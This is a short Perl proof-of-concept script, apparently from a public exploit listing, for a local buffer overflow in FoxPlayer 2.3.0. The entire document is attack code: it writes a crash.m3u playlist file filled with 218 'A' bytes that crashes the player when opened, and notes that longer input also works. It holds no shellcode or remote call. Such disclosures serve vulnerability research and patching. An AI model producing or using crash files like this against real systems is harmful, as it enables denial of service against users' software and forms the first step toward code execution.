#!/usr/bin/perl
###########################################################################
#Title: FoxPlayer Version 2.3.0 (.m3u) Local BOF PoC
#Download: http://www.foxmediatools.com/products/foxplayer.html
#Tested on WinXP Pro SP2
#Author: Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
#Greetz: offsec and inj3ct0r teams
###########################################################################
my $junk= "\x41" x 218 ; #Application will crash with 218 bytes, more will do the job too
open(file,">crash.m3u");
print file $junk ;
close(file);